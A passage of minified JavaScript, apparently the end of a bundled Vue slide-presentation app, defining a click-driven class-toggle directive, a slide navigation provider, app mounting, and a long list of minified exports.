0:o.value)!=null&&c.includes(t))&&o.value.push(t),t==null||t.classList.toggle(En,!0),r&&me(r,()=>{var p;const u=(p=r==null?void 0:r.value)!=null?p:0,d=s.value!=null?u>=s.value:u>l;t.classList.toggle(mr,d),t.classList.toggle(hr,d)},{immediate:!0})},unmounted(t,s){t==null||t.classList.toggle(En,!1);const o=ft(s,kn);o!=null&&o.value&&Qr(o.value,t)}})}}}function VE(e,t){const s=fd(e),o=md(t,s.currentRoute,s.currentPage);return{nav:{...s,...o,downloadPDF:dl,next:un,nextSlide:Zs,openInEditor:Ew,prev:dn,prevSlide:Gs},configs:we,themeConfigs:D(()=>we.themeConfig)}}function UE(){return{install(e){const t=VE(en,It);e.provide(U,Me(t))}}}const ys=Im(Sw);ys.use(bt);ys.use(Wm());ys.use(zE());ys.use(UE());HE({app:ys,router:bt});ys.mount("#app");export{ks as $,he as A,ke as B,rt as C,Vy as D,WE as E,Se as F,YE as G,It as H,No as I,vw as J,Er as K,gr as L,Ks as M,xr as N,Iu as O,X1 as P,Ql as Q,W1 as R,Zl as S,Ye as T,bd as U,Jy as V,Gl as W,Lt as X,KE as Y,Ut as Z,cd as _,n as a,go as a0,no as a1,Bn as a2,zt as a3,il as a4,xy as a5,wy as a6,Ey as a7,Sy as a8,W as a9,$u as aa,GE as ab,it as ac,Iv as ad,Fu as ae,ky as af,er as ag,jy as ah,D as b,$ as c,Ae as d,U as e,gt as f,Y as g,w as h,N as i,Ty as j,ww as k,we as l,Km as m,Pe as n,_ as o,ps as p,Me as q,z as r,XE as s,pn as t,QE as u,ZE as v,me as w,C as x,Ze as y,X as z};
